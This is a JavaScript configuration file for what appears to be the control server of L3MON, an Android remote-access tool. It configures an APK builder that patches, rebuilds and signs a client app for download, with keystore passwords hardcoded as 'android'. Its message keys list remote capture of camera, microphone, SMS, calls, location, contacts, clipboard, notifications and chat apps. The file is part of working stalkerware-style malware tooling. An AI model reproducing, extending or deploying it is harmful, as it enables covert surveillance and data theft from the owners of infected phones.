const path = require("path");

// Basic Configuration
exports.web_port = 8080;
exports.control_port = 22222;
exports.debug = false;

// Path Configuration
exports.projectRoot = path.join(__dirname, '..');
exports.assetsPath = path.join(exports.projectRoot, 'assets');
exports.factoryPath = path.join(exports.projectRoot, 'app', 'factory');

// APK Build Paths
exports.apkBuildPath = path.join(exports.factoryPath, 'build-unsigned.apk');
exports.apkSignedBuildPath = path.join(exports.assetsPath, 'webpublic', 'app-release.apk');
exports.outputPath = exports.factoryPath;

// Tools & Resources
exports.apkTool = path.join(exports.factoryPath, 'apktool.jar');
exports.apkSign = path.join(exports.factoryPath, 'uber-apk-signer.jar');
exports.keystore = path.join(exports.factoryPath, 'release.keystore');
exports.smaliPath = path.join(exports.factoryPath, 'decompiled');
exports.patchFilePath = path.join(exports.factoryPath, 'decompiled', 'smali', 'com', 'etechd', 'l3mon', 'IOSocket.smali');

// Downloads Configuration
exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(exports.assetsPath, 'webpublic', exports.downloadsFolder);

// Build Commands (simplified)
exports.buildCommand = `java -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}" -f -v`;
// Menggunakan uber-apk-signer karena lebih handal dan tidak membutuhkan jarsigner di PATH (cukup Java JRE)
exports.signCommand = `java -jar "${exports.apkSign}" --apks "${exports.apkBuildPath}" --ks "${exports.keystore}" --ksAlias androidkey --ksPass android --keyPass android --overwrite --verbose`;

// Message Keys
exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    chatApps: '0xCH'
};

// Log Types
exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
};